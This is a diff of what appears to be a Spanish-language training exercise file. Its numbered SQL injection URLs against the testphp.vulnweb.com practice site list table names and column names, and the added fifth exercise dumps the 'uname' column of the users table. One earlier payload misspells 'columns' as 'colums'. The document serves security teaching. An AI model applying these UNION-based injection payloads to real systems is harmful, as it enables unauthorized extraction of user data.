@@ -12,3 +12,6 @@ testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,group_concat(table_na
 
 ++ Ejercicio_4 Obtener el nombre de las columnas que conforman una tabla (Tabla users)
 testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,group_concat(column_name) from information_schema.colums where table_name="users"-- 
+
+++ Ejercicio_5 Obtener los registros asociados a una columna (Columna uname)
+testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,group_concat(uname) from users--
